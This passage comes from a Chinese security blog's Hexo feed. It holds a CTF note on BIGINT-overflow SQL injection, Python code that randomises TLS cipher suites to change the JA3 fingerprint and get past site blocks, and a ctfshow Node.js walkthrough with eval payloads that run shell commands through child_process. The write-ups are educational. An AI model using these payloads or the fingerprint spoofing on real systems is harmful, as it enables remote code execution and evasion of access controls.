<li><h4 id="最后的重点就是-9223372036854775807"><a href="#最后的重点就是-9223372036854775807" class="headerlink" title="最后的重点就是 9223372036854775807"></a>最后的重点就是 9223372036854775807</h4>  在mysql中，默认数字会视为<code>BIGINT</code>类型，也就是-9223372036854775808-9223372036854775807<br>  如果9223372036854775807+1就会溢出，然后报错。<br>  但是如果是9223372036854775808，他会默认把这个数字转换成<code>unsigned bigint</code>类型<br>  如下图<br>  <img src="/2022/09/28/%E5%9B%BD%E8%B5%9B%E5%88%9D%E8%B5%9Bsql%E6%B3%A8%E5%85%A5/1.jpg" alt><br>  <img src="/2022/09/28/%E5%9B%BD%E8%B5%9B%E5%88%9D%E8%B5%9Bsql%E6%B3%A8%E5%85%A5/2.jpg" alt><br>  那么如果直接设置9223372036854775808，他是不会报错的，因为会把他转化为<code>unsigned bigint</code>类型<br>  所以需要9223372036854775807+1，这样就超过bigint类型的最大范围<br>  当然也可以超过<code>unsigned bigint</code>，比如18446744073709551615+1，当然还有很多其它类型double类型之类的，都可以去溢出，原理相同，这种方法不会在语句中出现括号</li>
</ul>
<h2 id="4-参考链接"><a href="#4-参考链接" class="headerlink" title="4.参考链接"></a>4.参考链接</h2><ul>
<li>case:<a href="https://dev.mysql.com/doc/refman/8.0/en/case.html">https://dev.mysql.com/doc/refman/8.0/en/case.html</a></li>
<li>utf8mb4_bin:<a href="https://dev.mysql.com/doc/refman/8.0/en/charset-unicode-sets.html">https://dev.mysql.com/doc/refman/8.0/en/charset-unicode-sets.html</a></li>
<li>collate:<a href="https://www.jb51.net/article/214738.htm">https://www.jb51.net/article/214738.htm</a></li>
</ul>
]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>sql注入</tag>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>实战|看我如何从url跳转到盗号</title>
    <url>/2022/10/13/%E7%9C%8B%E6%88%91%E5%A6%82%E4%BD%95%E4%BB%8Eurl%E8%B7%B3%E8%BD%AC%E5%88%B0%E7%9B%97%E5%8F%B7/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码错误" data-whm="加密无法验证">
  <script id="hbeData" type="hbeData" data-hmacdigest="0812e8fe096560142d950d298e99d24f600648f50a342a34b549c556f208099a"></script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">密码</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>实战</tag>
        <tag>逻辑漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>hexo 敏感文件泄漏</title>
    <url>/2022/10/21/hexo-%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6%E6%B3%84%E6%BC%8F/</url>
    <content><![CDATA[<h2 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h2><p>在发上一篇文章的时候，因为涉及到敏感信息所以装了个插件<br><code>npm install --save hexo-blog-encrypt</code><br><span id="more"></span><br>给我的博文进行了加密访问<br>今天心血来潮，去我的github仓库看了一眼<br><img src="/2022/10/21/hexo-%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6%E6%B3%84%E6%BC%8F/1.jpg" alt><br>好家伙，发现图片全在里面，也就代表着别人只要翻一下我的仓库就能知道到底是哪个网站存在那个漏洞了</p>
<h2 id="看看别人存不存在这个问题"><a href="#看看别人存不存在这个问题" class="headerlink" title="看看别人存不存在这个问题"></a>看看别人存不存在这个问题</h2><p>这时候我就想到y4大佬的博客也有一些加密文章<br>我就去翻了一下<br><img src="/2022/10/21/hexo-%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6%E6%B3%84%E6%BC%8F/2.jpg" alt><br><img src="/2022/10/21/hexo-%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6%E6%B3%84%E6%BC%8F/4.jpg" alt><br><img src="/2022/10/21/hexo-%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6%E6%B3%84%E6%BC%8F/3.jpg" alt><br>看来大部分人都应该没有意识到这个问题，都是加密了文章，但是图片还是上传了上去<br>虽然泄漏的并不多，也就只有图片，但也算一个小漏洞吧</p>
<h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><p>因为不想花钱去买服务器，所以最后我就把图片链接全部改为图床的链接，应该就能解决这个问题了，然后把之前的图片全部删除掉</p>
]]></content>
      <categories>
        <category>信息泄漏</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>实战</tag>
        <tag>信息泄露</tag>
      </tags>
  </entry>
  <entry>
    <title>突破限制访问-修改ja3指纹</title>
    <url>/2022/10/22/%E7%AA%81%E7%A0%B4%E9%99%90%E5%88%B6%E8%AE%BF%E9%97%AE-%E4%BF%AE%E6%94%B9ja3%E6%8C%87%E7%BA%B9/</url>
    <content><![CDATA[<h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>因为在t00ls上看到有人提问，代理了ip也无法突破限制访问<br><span id="more"></span><br><img src="/2022/10/22/%E7%AA%81%E7%A0%B4%E9%99%90%E5%88%B6%E8%AE%BF%E9%97%AE-%E4%BF%AE%E6%94%B9ja3%E6%8C%87%E7%BA%B9/1.jpg" alt><br>我就想到了可能是对方网站是识别了你的tls特征<br>那么就需要修改这些特征，去突破访问限制</p>
<h2 id="入门ja3指纹"><a href="#入门ja3指纹" class="headerlink" title="入门ja3指纹"></a>入门ja3指纹</h2><h3 id="TLS会话"><a href="#TLS会话" class="headerlink" title="TLS会话"></a>TLS会话</h3><p>因为ja3指纹是基于TLS协议的，所以要先简单了解一下这个协议<br>TLS是ssl的进阶版本，用于加密会话<br>当初始化一个TLS会话的时候，需要进行先进行最基本的三次握手<br>在三次握手后，客户端会向服务端发送一个Client Hello包，然后服务端向客户端发送Server Hello包，这里我们主要关注这个Client Hello包<br><img src="/2022/10/22/%E7%AA%81%E7%A0%B4%E9%99%90%E5%88%B6%E8%AE%BF%E9%97%AE-%E4%BF%AE%E6%94%B9ja3%E6%8C%87%E7%BA%B9/2.jpg" alt></p>
<h3 id="Client-Hello包基本结构"><a href="#Client-Hello包基本结构" class="headerlink" title="Client Hello包基本结构"></a>Client Hello包基本结构</h3><p><img src="/2022/10/22/%E7%AA%81%E7%A0%B4%E9%99%90%E5%88%B6%E8%AE%BF%E9%97%AE-%E4%BF%AE%E6%94%B9ja3%E6%8C%87%E7%BA%B9/3.jpg" alt></p>
<p><br><br>这里只需要关注几个字段就行了</p>
<p>version:TLS的版本,这里是0x0303<br><img src="/2022/10/22/%E7%AA%81%E7%A0%B4%E9%99%90%E5%88%B6%E8%AE%BF%E9%97%AE-%E4%BF%AE%E6%94%B9ja3%E6%8C%87%E7%BA%B9/4.jpg" alt></p>
<p><br><br>Cipher Suites:列举出客户端支持的加密算法，每一种加密算法对应一个hex值<br><img src="/2022/10/22/%E7%AA%81%E7%A0%B4%E9%99%90%E5%88%B6%E8%AE%BF%E9%97%AE-%E4%BF%AE%E6%94%B9ja3%E6%8C%87%E7%BA%B9/5.jpg" alt></p>
<p><br><br>一系列Extension，每个都有不同的含义，这里不需要关注具体用处，只要知道是用一个十六进制值去代表每一种extension的就可以了<br><img src="/2022/10/22/%E7%AA%81%E7%A0%B4%E9%99%90%E5%88%B6%E8%AE%BF%E9%97%AE-%E4%BF%AE%E6%94%B9ja3%E6%8C%87%E7%BA%B9/6.jpg" alt></p>
<h3 id="ja3指纹计算"><a href="#ja3指纹计算" class="headerlink" title="ja3指纹计算"></a>ja3指纹计算</h3><p>ja3的计算主要就是由上面那几个字段的十进制组合在一起，然后计算他们的md5，格式如下：<br><strong>TLSVersion,Cipher Suites,Extensions Type,Supported Groups,Elliptic curves point formats</strong><br>当一个字段有不同的类型，就用 “-” 按照<strong>顺序</strong>依次去连接，这个顺序很重要一会儿会提到<br>例如我这里就是<br><strong>771,4866-4867-4865-157-49313-49309-156-49312-49308-61-60-53-47-163-159-52394-49315-49311-49239-49235-162-158-49314-49310-49238-49234-107-106-196-195-103-64-190-189-57-56-136-135-51-50-69-68-49196-49200-49327-49325-49188-49192-49162-49172-49233-49232-192-186-132-65-52393-52392-49245-49249-49195-49199-49326-49324-49244-49248-49267-49271-49187-49191-49266-49270-49161-49171-255,0-11-10-16-22-23-49-13-43-45-51-21,29-23-30-25-24,0-1-2</strong><br>进行md5加密后就是ja3指纹了<br><strong>a6b4648af79cb0e6c9070f2fca7d5ac2</strong></p>
<p>下面我依次介绍每块第一个数字的由来</p>
<p>771就是0x0303的十进制<br><img src="/2022/10/22/%E7%AA%81%E7%A0%B4%E9%99%90%E5%88%B6%E8%AE%BF%E9%97%AE-%E4%BF%AE%E6%94%B9ja3%E6%8C%87%E7%BA%B9/14.jpg" alt><br><br><br>4866就是，0x1302的十进制<br><img src="/2022/10/22/%E7%AA%81%E7%A0%B4%E9%99%90%E5%88%B6%E8%AE%BF%E9%97%AE-%E4%BF%AE%E6%94%B9ja3%E6%8C%87%E7%BA%B9/8.jpg" alt><br><br><br>0就是Extension:Server Name的type<br><img src="/2022/10/22/%E7%AA%81%E7%A0%B4%E9%99%90%E5%88%B6%E8%AE%BF%E9%97%AE-%E4%BF%AE%E6%94%B9ja3%E6%8C%87%E7%BA%B9/9.jpg" alt><br><br><br>29就是Extension Supported Groups中的Supported Groups第一个<br><img src="/2022/10/22/%E7%AA%81%E7%A0%B4%E9%99%90%E5%88%B6%E8%AE%BF%E9%97%AE-%E4%BF%AE%E6%94%B9ja3%E6%8C%87%E7%BA%B9/10.jpg" alt><br><br><br>0就是Extension ec_point_formats中Elliptic curves point formats第一个<br><img src="/2022/10/22/%E7%AA%81%E7%A0%B4%E9%99%90%E5%88%B6%E8%AE%BF%E9%97%AE-%E4%BF%AE%E6%94%B9ja3%E6%8C%87%E7%BA%B9/11.jpg" alt></p>
<p>在wireshark最下面也会有显示这个ja3，但是这个并不会真正的存在于数据包中，而是服务端提取到客户端的相应字段进行计算后得到的<br><img src="/2022/10/22/%E7%AA%81%E7%A0%B4%E9%99%90%E5%88%B6%E8%AE%BF%E9%97%AE-%E4%BF%AE%E6%94%B9ja3%E6%8C%87%E7%BA%B9/7.jpg" alt></p>
<h2 id="伪造ja3指纹"><a href="#伪造ja3指纹" class="headerlink" title="伪造ja3指纹"></a>伪造ja3指纹</h2><h3 id="用不同代理去访问网站"><a href="#用不同代理去访问网站" class="headerlink" title="用不同代理去访问网站"></a>用不同代理去访问网站</h3><p>这个网站可以看到自己的ja3指纹 <a href="https://kawayiyi.com/tls">https://kawayiyi.com/tls</a><br>我这里是用pandavpn的全局模式<br><img src="/2022/10/22/%E7%AA%81%E7%A0%B4%E9%99%90%E5%88%B6%E8%AE%BF%E9%97%AE-%E4%BF%AE%E6%94%B9ja3%E6%8C%87%E7%BA%B9/12.jpg" alt>可以看到我的ip是<strong>107.187.83.12</strong>，我的tlsHashMd5也就是ja3指纹是<strong>6e43eefeaec91453751b092058ec8dd2</strong><br>当我换一个ip去访问的时候<br><img src="/2022/10/22/%E7%AA%81%E7%A0%B4%E9%99%90%E5%88%B6%E8%AE%BF%E9%97%AE-%E4%BF%AE%E6%94%B9ja3%E6%8C%87%E7%BA%B9/13.jpg" alt><br>可以看到我的ip虽然变成了<strong>139.64.165.246</strong>，但是tlsHashMd5（ja3指纹）仍然是<strong>6e43eefeaec91453751b092058ec8dd2</strong><br>所以有时候就算各种换代理也无法访问网站可能就是这个原因，被记录下了ja3指纹</p>
<h3 id="修改ja3指纹"><a href="#修改ja3指纹" class="headerlink" title="修改ja3指纹"></a>修改ja3指纹</h3><p>那么当我们去修改Client Hello里面的一些信息，就可以达到修改ja3指纹突破访问限制，下面我直接贴出修改代码<br><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> requests.adapters <span class="keyword">import</span> HTTPAdapter</span><br><span class="line"><span class="keyword">from</span> requests.packages.urllib3.util.ssl_ <span class="keyword">import</span> create_urllib3_context</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> requests,time</span><br><span class="line"></span><br><span class="line">ORIGIN_CIPHERS = (<span class="string">&#x27;ECDH+AESGCM:DH+AESGCM:ECDH+AES256:DH+AES256:ECDH+AES128:DH+AES:ECDH+HIGH:&#x27;</span></span><br><span class="line"><span class="string">&#x27;DH+HIGH:ECDH+3DES:DH+3DES:RSA+AESGCM:RSA+AES:RSA+HIGH:RSA+3DES&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">DESAdapter</span>(<span class="title class_ inherited__">HTTPAdapter</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, *args, **kwargs</span>):</span><br><span class="line">        CIPHERS = ORIGIN_CIPHERS.split(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">        random.shuffle(CIPHERS)</span><br><span class="line">        CIPHERS = <span class="string">&#x27;:&#x27;</span>.join(CIPHERS)</span><br><span class="line">        self.CIPHERS = CIPHERS + <span class="string">&#x27;:!aNULL:!eNULL:!MD5&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>().__init__(*args, **kwargs)</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">init_poolmanager</span>(<span class="params">self, *args, **kwargs</span>):</span><br><span class="line">        context = create_urllib3_context(ssl_version=<span class="number">2</span>,ciphers=self.CIPHERS)</span><br><span class="line">        kwargs[<span class="string">&#x27;ssl_context&#x27;</span>] = context</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>(DESAdapter, self).init_poolmanager(*args, **kwargs)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># def proxy_manager_for(self, *args, **kwargs):</span></span><br><span class="line">    <span class="comment">#     context = create_urllib3_context(ssl_version=2,ciphers=self.CIPHERS)</span></span><br><span class="line">    <span class="comment">#     kwargs[&#x27;ssl_context&#x27;] = context</span></span><br><span class="line">    <span class="comment">#     super(DESAdapter, self).proxy_manager_for(*args, **kwargs)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">SpoofJa3Get</span>(<span class="params">url,headers</span>):</span><br><span class="line">    s = requests.Session()</span><br><span class="line">    s.headers.update(headers)</span><br><span class="line">    s.mount(url, DESAdapter())</span><br><span class="line">    resp = s.get(url)</span><br><span class="line">    <span class="keyword">return</span> resp</span><br><span class="line">    </span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    resp = SpoofJa3Get(<span class="string">&#x27;https://kawayiyi.com/tls&#x27;</span>,&#123;<span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36 Edg/92.0.902.67&#x27;</span>&#125;)</span><br><span class="line">    data = resp.json()</span><br><span class="line">    <span class="built_in">print</span>(data[<span class="string">&#x27;tlsHashMd5&#x27;</span>])</span><br></pre></td></tr></table></figure></p>
<p>这个是运行效果，可以看到ja3指纹确实都改变了<br><img src="/2022/10/22/%E7%AA%81%E7%A0%B4%E9%99%90%E5%88%B6%E8%AE%BF%E9%97%AE-%E4%BF%AE%E6%94%B9ja3%E6%8C%87%E7%BA%B9/15.jpg" alt></p>
<p>接下来简单讲解一下代码<br>这里主要是去继承原先的HTTPAdapter，在构造函数中将Cipher Suites进行打乱随机排序，然后去重写<code>init_poolmanager</code><br>可以看到官方文档介绍这个函数</p>
<blockquote>
<p>Initializes a urllib3 PoolManager.<br>&nbsp;&nbsp;&nbsp;This method should not be called<br>&nbsp;&nbsp;&nbsp;from user code, and is only exposed for use when subclassing the<br>&nbsp;&nbsp;&nbsp;:class:`HTTPAdapter <requests.adapters.HTTPAdapter>`.<br>&nbsp;&nbsp;&nbsp;:param connections: The number of urllib3 connection pools to cache.<br>&nbsp;&nbsp;&nbsp;:param maxsize: The maximum number of connections to save in the pool.<br>&nbsp;&nbsp;&nbsp;:param block: Block when no free connections are available.</requests.adapters.HTTPAdapter></p>
</blockquote>
<p>只有短短的一句，根据名称猜测就是初始化一个连接池之类的，然后每次访问别的网站都要基于这个连接池去访问，类似与urllib3的PoolManager</p>
<p>create_urllib3_context 官方文档介绍我就不贴出来了，具体可以看<br><a href="https://github.com/urllib3/urllib3/blob/main/src/urllib3/util/ssl_.py#L221">https://github.com/urllib3/urllib3/blob/main/src/urllib3/util/ssl_.py#L221</a><br>简单说一下就是创建并且配置一个ssl内容的实例，并且返回这个实例，但是给出的参数与ja3指纹相关的只有</p>
<ul>
<li>ssl version</li>
<li>cipher suites</li>
</ul>
<p>ssl版本我们不能随便修改，不然就会出错，能修改的只有支持的加密算法<br>后面的代码我就不做过多解释了，应该都是很简单的</p>
<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>至于怎么去修改Extensions Type,Supported Groups,Elliptic curves point formats来进行修改ja3指纹，我就不太清楚了<br>之前在stackoverflow上面问了一个跟我有同样疑惑的网友，问他现在解决没有，但是评论不知道为什么被系统秒删了，我也就没去进行深究了<br><a href="https://stackoverflow.com/questions/69982651/tls-adapter-for-extentions-with-python3-requests/74032540#74032540">https://stackoverflow.com/questions/69982651/tls-adapter-for-extentions-with-python3-requests/74032540#74032540</a></p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
<li><a href="https://engineering.salesforce.com/tls-fingerprinting-with-ja3-and-ja3s-247362855967/">https://engineering.salesforce.com/tls-fingerprinting-with-ja3-and-ja3s-247362855967/</a></li>
<li><a href="https://www.cnblogs.com/theseventhson/p/14613527.html">https://www.cnblogs.com/theseventhson/p/14613527.html</a></li>
<li><a href="https://stackoverflow.com/questions/40373115/how-to-select-specific-the-cipher-while-sending-request-via-python-request-modul">https://stackoverflow.com/questions/40373115/how-to-select-specific-the-cipher-while-sending-request-via-python-request-modul</a></li>
<li><a href="https://urllib3.readthedocs.io/en/stable/reference/urllib3.poolmanager.html">https://urllib3.readthedocs.io/en/stable/reference/urllib3.poolmanager.html</a></li>
</ul>
]]></content>
      <categories>
        <category>爬虫</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>爬虫</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux</title>
    <url>/2022/10/23/Linux/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码错误" data-whm="加密无法验证">
  <script id="hbeData" type="hbeData" data-hmacdigest="4f74c5600ed2ff7c4a412b5f02b26a87c84a022460e1aadf1ac029588e8193ff">d6bd1a4f701c954e0bdc9221d325612e9fb95b08b8707ca50f6a0a141327e998b7460c56b9b06ddde7e6133c1f63194114453bea2deeba3bcb5d7a936ffa347ff778d7e44c6a1dd632fbacd6b7ca63e26bc3822a9c98d51ddce3bc9b16d0caa868115ba148e9b6aa9bb24d898633bd64ea46147ca2183c1976ee9da37b1a04f57fa922efc711ddb0684833695dd124c8eb367ef7d908aedb04f1cb3c0f69b201af170eb67c36ef89b1b8b543625d8ea2dd9c47a3de841200700549c5d1be9fc8e654e9dc8ed6b3ff72a042648a870c30eebb538d44f674440836e4a7354f89197b3690166bed68c03514de6333e608e0f243e1ffd7e7e31c7630f4669c4f9d0504d49e3471aae444ba8ca146a0fe97eb641af422f2eb61e94e7ce4fe943a57eeea2111288131f69d82eaefe1171c82b7dc576443ed83a116d4711dd5ce32bafb736346476bda03d45325535ad5d1750821916ee094f1e054f37125f2a49643b76b535c8470f8aa50f11af1da86978eb49b6ae9f6aab5e8ca54ca20c167b131ea3b0a012111d79692df7d0e80d7f7f70955d406573527071dbac4e8d262865a2fee9669fe099a5c5aeafab92867265f68da814285c2b7fe2435a59498150d44e437b63674b6f6c3c2812d4b2799e65ba08021e41226ad8121955a1de0f16aed15498674afa7943d000a80506d30009b832eb5aa1992229dd5145e1b05a7ce4cf40970e1bed6319d113b17def466e7326260d6227460af9f89006a3a0305781e4428a936aaabec3ad10a3352048f3a3eb3338c8bd62ce286e6eb55af91a12a53f9bfb053b2b1e8bc3288a810db2c0e6b97e0aed7efa64a5e8916bd5615cd8450a07a567ed2c2dad58a4217d1401439f58ce8b426eca85b79e0e90b71a5d1ccf4fc81853850e2a2ba1373132dd14c68a328ba60fe492e37acd93839d0866fce200835097001f5bf83d7979a8ffd9ef92fa8f15a08ade408d6de4769398c91d6d88461cc0fd41284ce9a347a4dc8ab6c8848ddc2a0156b4ac577d4e9e8e06754a10c07380106083218eeae0fbb77c697db85adfb2f5cf03212eb92a937f29eda38d8101dbda9e33c780ad2a5b1af402cd3efd88c442f37a1796cfec68971f5f5e4036c7ed99ff74c7a908c02b73442bc9722bf45c31d720e2c39a50bc716fd1da93cd112b895eeae801d4d8a5ce86c51baf630004f93dcb8ceeb5c77def4262845544745c9ed2346b53a7b7e6a718245bc7bf4b4e8209a2d57d27b5d88a0d2bcffb1117e1bc7c7bdf0ea37a042b6cd00e9acd57fd4e6a6d2791a8f7b7ffa817fc80b5a98b5cfac2677862d68f9e755e3841ca60617bfe1f6875ebe171c4b546e563ef840f2b0cd6f85c76142eda78bd5c1e45b07ad0168fa15266cde1533c2bd0d5bdeb20d6b10d517a1a56e734ca1bbaece2c2931afffea70090801692b50e0da76a88f2221e7b3eeffb56117e114630ec36ee1e8a7eab68ebbeeef5c2e32091e8f4d26cdacb2afca1f472a073736adc50561a40bf0b3d0d75f27f2ca234151b26cff23f147d37866f2c54f466a9a5d4dd9acda91a9b523746afccbde1f437eed0d8bae896c9765dd98684ce63a4172a296338436381709036aeaeb2b2a6689935cbe64221a7ad6f89f09bb3f7c5829b68ec0b78a6b5e5062e9421b07db3b9954540ff0f395b009b65f90f9345ca73255b7108779ffc404fcbe598b941f6062de95248d4827b3524214155e6649620e4be0a8ce65ce46029c48eebb8e9e25dc66e8b5d411b03353eec52f2b0f760fe2fb027d43615dcb391ee21584521cb77eea4f61f6c0acceedcf9c99b99c442443b76dd8208b5f682c948604264f9beeb51b741c3a04f863dc167c360dc7d5a7110f3c71024be8647737bf193bb1e02787b031013aeb2ba5eede0a30a77ee8710d941e49f94d95aa592beb29116f75969fe686fde91b83899d9bbcb78598619f583f80324342cf71eeb5833bf6a31f3cfd3f519c20a8526b92fbb588524a65317ce0beeb972159740e8058b72f4185b0de54602cb19cd88850395b7cb3cc77a3fa39058054c533332653e0bcefcd20238ff769ca5e0d950d3cdbb2eb54066938c29065330f29074d3e7531eab0b89eb16f9b23f4de96b462fa7982f09502c83436310d8715d890b95588396d5ae0b8dea6a5ff49a12519b85867c3abaee49034c92b3797afc0c3ef73f98fd05cdb19e5f7be23342ea7e2f028988893abf385297555b3317e9935267ae8c9cd8f775129383f00e75ac84cdc3581bf7d06de31206bc194b8829c8916e8bfc283f1f3cc1c851aaa73d00d7ff0a3a17951463ea3eb048b1ecd37c5f9e59c4bc5b8415fec906c9ab8013a0040e785d959e21acdce737336c43c805b7f556c3a0cb926a0820d964acf04c9d72045c5aa5221439214e37eb9fbf9e6c6809fa39595c598a43d4d966012c7e6731c0705cbe8ba7b694594c8297699db8af1d7244c50d995ae249d16367fe0fc1292abbc45156a2515959ab80e41254e7263e8c8a6155b1d080d80766058811fcdc4c0941e42809988d81ac51c596e68d79250c3513c68d88354bb3151e355a6d3686e960ad5c7e4567d552a703971da64114bffd273fc74b00bdbb1767e64872d9a7f895c9fd6acb00dee1e8122afb61899ce77aecd65c9ad0d18ed59b60e08d67c3c861741b50c4e90b0c608ceb3df1e6b567e8ff831f25c9bd1802191684744ec695e39a8021062175c60b31257eea4dc3834335edc5ca804cee9a7c8e76e906609aa809a5a1ba0dc424b68324d70a74a2d4c395eacff2904a17b67f2ee892f646ada7d5886c0686b8991727e9513367b824b2a94fe5a424be50bb21e4a116e186fdae46439221b0882a891189507db7e1b5ecc9625f3c329ae691cfaa4de7cb24d8232d2f7523e6cf832d949f2e6dd20478a48786db8d9b168f9faed959778703ef86fa9b0a697e252a627fe3db814ba3ce5831d891dfb4ced54500e65b4538fe7ee584746fb40c9407c95eac07a9691062363f1dd9a642fb666693da00ac7c83faeda908c333a9590665a92d36fa634ad69a8efbb366a465a11d2b40c81c25d25121d3ec9683311f126db59e56d27958c6dadc9c22ad89ccada326ce373dc3d9700dd197b01218c21af213658230be1dce0ed912ba272b951fbdc5f6b922d9548edc9a557b9be3a949396dd896fff1d910b7c10a3ec2899ea2f951b8a04e881347240c5920f34da835efc53c2063dd55c46f34578af8e43906fb4b2cf2e3cd1720a1e0d95fd5b0f694d3d6c57edf4d47fa08eb307d95f6a1f8992c1376505b90c4df8a5fb3bace4fbc8e45de3de2cb4c53f5babd8350c9c6fe6839ebce57c937a2711c4ec07f7b8dd9e23f862149f0e79a40402949eb7e45428ae5a4a5848bba6f955467f2f00ebd65cc190280f21b921e16979768af680d075bdede7d41671545cd642de70ddb9dd43bc3439f0886cbf32ec376cfb90a8b8b3c6230278085f8543a0468102f0ae55b402fe4830fb109a62e70da4ddef5e817027a5b2e9dc32eea2ad849fc63e401cc6dda09106fdf1e2ad2a54663f6c6c680dc0254bc4d0d5bed377deac710734f75d39cd019e0528858149f9330b4a627967961855ea3cfd978199ec3ed7a3fefc3b00fa871cbc9b7b3a994dda62176c81f5d079e8934d5548a2519b746985ef612ba533d7243480ebb653d1331943601cb333cf17966724bda84ddcd58b2c05151370b1832a8f6d6de7ca23027f5f049ae1db34c0dd180c7bdc7f350d8f54d0fa552f80ad64ff15d3c5188710729522e1943cbf43077660296bae642f1958e975d3f0751cfe9dba6403a5dc49f74f8cd646a80300366fa924549d2b3a1db7cb7add3098794219bf099225546933031029af2f51a6fde07353fe1aab7425dae6c6c5702abd76f4473c299f1ddeb6f7f7460c03305058baacd60e4ab5f0891b21d6ba47f976c1fc85a500358d54532ed7630425268e33525b47f7063422607e625454df2123994b98e03f4c6db6fa5c3a1b1896570597e1000b33da8e9fac65b01372cacf</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">密码</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
  </entry>
  <entry>
    <title>ctfshow-nodejs</title>
    <url>/2022/11/28/ctfshow-nodejs/</url>
    <content><![CDATA[<h2 id="web334"><a href="#web334" class="headerlink" title="web334"></a>web334</h2><span id="more"></span>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> findUser = <span class="keyword">function</span>(<span class="params">name, password</span>)&#123;</span><br><span class="line">  <span class="keyword">return</span> users.<span class="title function_">find</span>(<span class="keyword">function</span>(<span class="params">item</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> name!==<span class="string">&#x27;CTFSHOW&#x27;</span> &amp;&amp; item.<span class="property">username</span> === name.<span class="title function_">toUpperCase</span>() &amp;&amp; item.<span class="property">password</span> === password;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>看到前面<br><code>name!==&#39;CTFSHOW&#39;</code><br>后面<br><code>item.username === name.toUpperCase</code><br>那么直接输入小写ctfshow和123456即可绕过</p>
<blockquote>
<p>在Character.toUpperCase()函数中，字符ı会转变为I，字符ſ会变为S。<br>在Character.toLowerCase()函数中，字符İ会转变为i，字符K会转变为k。</p>
</blockquote>
<h2 id="web335"><a href="#web335" class="headerlink" title="web335"></a>web335</h2><p>查看源码，知道参数/?eval=<br>传入参数<br><code>eval=require(&#39;child_process&#39;).exec(&#39;id&#39;);</code><br><img src="/2022/11/28/ctfshow-nodejs/1.jpg" alt><br>可以看到是object Object 无回显<br>因为exec返回的是 ChildProcess<br><a href="http://nodejs.cn/api/child_process.html">http://nodejs.cn/api/child_process.html</a><br>查看文档可以替换成如下函数<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">命令执行</span><br><span class="line">?<span class="built_in">eval</span>=<span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">execSync</span>(<span class="string">&#x27;ls&#x27;</span>).<span class="title function_">toString</span>();</span><br><span class="line">?<span class="built_in">eval</span>=<span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">spawnSync</span>(<span class="string">&#x27;cat&#x27;</span>,[<span class="string">&#x27;fl00g.txt&#x27;</span>]).<span class="property">output</span>;</span><br><span class="line">?<span class="built_in">eval</span>=<span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">spawnSync</span>(<span class="string">&#x27;cat&#x27;</span>,[<span class="string">&#x27;fl00g.txt&#x27;</span>]).<span class="property">stdout</span>;</span><br><span class="line">?<span class="built_in">eval</span>=<span class="variable language_">global</span>.<span class="property">process</span>.<span class="property">mainModule</span>.<span class="property">constructor</span>.<span class="title function_">_load</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">exec</span>(<span class="string">&#x27;ls&#x27;</span>);</span><br></pre></td></tr></table></figure><br><figure class="highlight js"><table><tr><td class="code"><pre><span 